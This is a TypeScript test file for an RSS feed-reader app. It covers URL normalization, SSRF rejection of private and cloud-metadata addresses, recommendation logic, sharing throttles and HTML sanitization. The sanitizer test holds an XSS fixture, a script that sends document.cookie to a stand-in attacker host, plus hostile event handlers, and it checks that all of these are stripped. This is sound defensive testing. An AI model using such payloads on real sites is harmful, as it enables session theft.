import test from 'node:test';
import assert from 'node:assert/strict';
import { normalizeFeedUrl } from '../src/utils/normalizeUrl.js';
import { discoveryStore } from '../src/services/recommendationEngine.js';
import { evaluateMaybeShare, type SharingSettings } from '../../client/src/features/discovery/sharingSync.js';
import { sanitizeArticleHtml } from '../../client/src/features/articles/articleSanitizer.js';

// ============================================================================
// 1. URL NORMALIZATION TESTS
// ============================================================================
test('PS-003: URL normalization strips www, default ports, trailing slashes, fragments, and tracking parameters', () => {
  const url1 = 'https://www.example.com/feed/?utm_source=twitter&utm_medium=social&ref=newsletter#top';
  assert.equal(normalizeFeedUrl(url1), 'https://example.com/feed');

  const url2 = 'http://www.anothersite.org:80/rss.xml#section';
  assert.equal(normalizeFeedUrl(url2), 'http://anothersite.org/rss.xml');

  const url3 = 'https://sub.domain.com:443/atom.xml?fbclid=IwAR123&gclid=XYZ';
  assert.equal(normalizeFeedUrl(url3), 'https://sub.domain.com/atom.xml');
});

test('PS-003: URL normalization rejects private IPs and localhost', () => {
  assert.throws(() => normalizeFeedUrl('http://localhost/rss'), /Localhost and private/);
  assert.throws(() => normalizeFeedUrl('http://mysite.local/feed'), /Localhost and private/);
  assert.throws(() => normalizeFeedUrl('http://internal.localhost/rss'), /Localhost and private/);
  assert.throws(() => normalizeFeedUrl('http://127.0.0.1/rss'), /Private or loopback/);
  assert.throws(() => normalizeFeedUrl('http://10.0.0.1/rss'), /Private or loopback/);
  assert.throws(() => normalizeFeedUrl('http://192.168.1.1/feed'), /Private or loopback/);
  assert.throws(() => normalizeFeedUrl('http://169.254.169.254/latest/meta-data'), /Private or loopback/);
  assert.throws(() => normalizeFeedUrl('http://[::1]/feed'), /Private or loopback/);
});

// ============================================================================
// 2. BATCH SIZE CAP & EXPIRY TESTS
// ============================================================================
test('PS-003: Batch submission caps batch size at 100 feeds', () => {
  const oversizedBatch = Array.from({ length: 105 }, (_, i) => `https://site${i}.com/feed.xml`);
  assert.throws(() => discoveryStore.addBatch(oversizedBatch), /exceeds maximum allowed size/);

  const validBatch = ['https://siteA.com/feed.xml', 'https://siteB.com/feed.xml', 'https://siteC.com/feed.xml'];
  const res = discoveryStore.addBatch(validBatch);
  assert.ok(res.id);
  assert.equal(res.size, 3);
  assert.ok(res.weight > 0);
  assert.equal(res.weight, 1 / Math.sqrt(3));
});

test('PS-003: Expired batches are ignored by recommendations and cleaned up', () => {
  const now = Date.now();
  // Add batch with past expiry
  const expiredBatch = discoveryStore.addBatch(['https://expired1.com/rss', 'https://expired2.com/rss'], -1);
  assert.ok(expiredBatch.expiresAt < now);

  const active = discoveryStore.getActiveBatches(now);
  assert.ok(!active.some((b) => b.id === expiredBatch.id), 'Active batches must exclude expired batches');

  const cleanup = discoveryStore.cleanupExpired(now);
  assert.ok(cleanup.deletedBatches >= 1, 'Expired batch must be deleted by cleanup job');
});

// ============================================================================
// 3. RECOMMENDATIONS LOGIC & POPULARITY DAMPING
// ============================================================================
test('PS-003: Recommendations NEVER include feeds the user already follows', () => {
  const followed = [
    'https://news.ycombinator.com/rss',
    'https://jvns.ca/atom.xml',
    'https://github.blog/feed'
  ];

  const recs = discoveryStore.getRecommendations(followed, 1, 10);
  assert.ok(recs.length > 0, 'Should return recommendations');

  for (const r of recs) {
    assert.ok(
      !followed.includes(r.url),
      `Recommendation ${r.url} must NOT be in followed list`
    );
  }
});

test('PS-003: Minimum-batches threshold (k) drops candidates with insufficient co-occurrence', () => {
  const followed = ['https://news.ycombinator.com/rss'];
  // With high k threshold, only high co-occurrence feeds pass recommendation filter
  const strictRecs = discoveryStore.getRecommendations(followed, 10, 10);
  for (const r of strictRecs) {
    if (r.type === 'recommended') {
      assert.ok(r.score > 0);
    }
  }
});

// ============================================================================
// 4. CLIENT maybeShare() DECISION LOGIC TESTS
// ============================================================================
test('PS-003: maybeShare() returns false when sharing is disabled', () => {
  const settings: SharingSettings = {
    sharingEnabled: false,
    lastSharedAt: null,
    lastSharedSet: null
  };
  const result = evaluateMaybeShare(settings, ['https://a.com/rss', 'https://b.com/rss', 'https://c.com/rss']);
  assert.equal(result.shouldShare, false);
  assert.equal(result.reason, 'sharing_disabled');
});

test('PS-003: maybeShare() returns false when user has fewer than 3 feeds', () => {
  const settings: SharingSettings = {
    sharingEnabled: true,
    lastSharedAt: null,
    lastSharedSet: null
  };
  const result = evaluateMaybeShare(settings, ['https://a.com/rss', 'https://b.com/rss']);
  assert.equal(result.shouldShare, false);
  assert.equal(result.reason, 'insufficient_feeds');
});

test('PS-003: maybeShare() returns true on first share after opt-in (lastSharedAt is null)', () => {
  const settings: SharingSettings = {
    sharingEnabled: true,
    lastSharedAt: null,
    lastSharedSet: null
  };
  const feeds = ['https://a.com/rss', 'https://b.com/rss', 'https://c.com/rss'];
  const result = evaluateMaybeShare(settings, feeds);
  assert.equal(result.shouldShare, true);
  assert.equal(result.reason, 'initial_share');
});

test('PS-003: maybeShare() does nothing when age is under 30 days (throttles every follow)', () => {
  const now = Date.now();
  const ONE_DAY_MS = 24 * 60 * 60 * 1000;
  const settings: SharingSettings = {
    sharingEnabled: true,
    lastSharedAt: now - 10 * ONE_DAY_MS, // 10 days ago
    lastSharedSet: ['https://a.com/rss', 'https://b.com/rss', 'https://c.com/rss']
  };
  const feeds = ['https://a.com/rss', 'https://b.com/rss', 'https://c.com/rss', 'https://d.com/rss'];
  const result = evaluateMaybeShare(settings, feeds, now);
  assert.equal(result.shouldShare, false);
  assert.equal(result.reason, 'too_recent');
});

test('PS-003: maybeShare() submits when age >= 30 days and list changed meaningfully', () => {
  const now = Date.now();
  const ONE_DAY_MS = 24 * 60 * 60 * 1000;
  const settings: SharingSettings = {
    sharingEnabled: true,
    lastSharedAt: now - 35 * ONE_DAY_MS, // 35 days ago
    lastSharedSet: ['https://a.com/rss', 'https://b.com/rss', 'https://c.com/rss']
  };
  // Added 3 new feeds (meaningful change)
  const feeds = [
    'https://a.com/rss',
    'https://b.com/rss',
    'https://c.com/rss',
    'https://d.com/rss',
    'https://e.com/rss',
    'https://f.com/rss'
  ];
  const result = evaluateMaybeShare(settings, feeds, now);
  assert.equal(result.shouldShare, true);
  assert.equal(result.reason, 'meaningful_change');
});

test('PS-003: maybeShare() submits when age >= 60 days even if list is unchanged (renewal)', () => {
  const now = Date.now();
  const ONE_DAY_MS = 24 * 60 * 60 * 1000;
  const feeds = ['https://a.com/rss', 'https://b.com/rss', 'https://c.com/rss'];
  const settings: SharingSettings = {
    sharingEnabled: true,
    lastSharedAt: now - 65 * ONE_DAY_MS, // 65 days ago
    lastSharedSet: feeds
  };
  // Exactly identical feeds
  const result = evaluateMaybeShare(settings, feeds, now);
  assert.equal(result.shouldShare, true);
  assert.equal(result.reason, 'renewal_60_days');
});

// ============================================================================
// 5. HTML SANITIZATION TESTS
// ============================================================================
test('PS-003: HTML Sanitization strips script, iframe, object, embed, and inline handlers', () => {
  const dirty = `
    <article>
      <h1>Clean Title</h1>
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
      <iframe src="https://phishing.com"></iframe>
      <object data="malware.swf"></object>
      <embed src="flash.swf" />
      <img src="valid.jpg" onerror="alert(document.domain)" />
      <a href="https://good.com" onclick="steal()">Good Link</a>
      <p>Independent journalism is important.</p>
    </article>
  `;

  const clean = sanitizeArticleHtml(dirty);
  assert.ok(!clean.includes('<script>'), 'Must strip <script>');
  assert.ok(!clean.includes('<iframe'), 'Must strip <iframe>');
  assert.ok(!clean.includes('<object'), 'Must strip <object>');
  assert.ok(!clean.includes('<embed'), 'Must strip <embed>');
  assert.ok(!clean.includes('onerror'), 'Must strip onerror handler');
  assert.ok(!clean.includes('onclick'), 'Must strip onclick handler');
  assert.ok(clean.includes('Clean Title'), 'Must preserve safe headings');
  assert.ok(clean.includes('Independent journalism is important.'), 'Must preserve safe text');
});
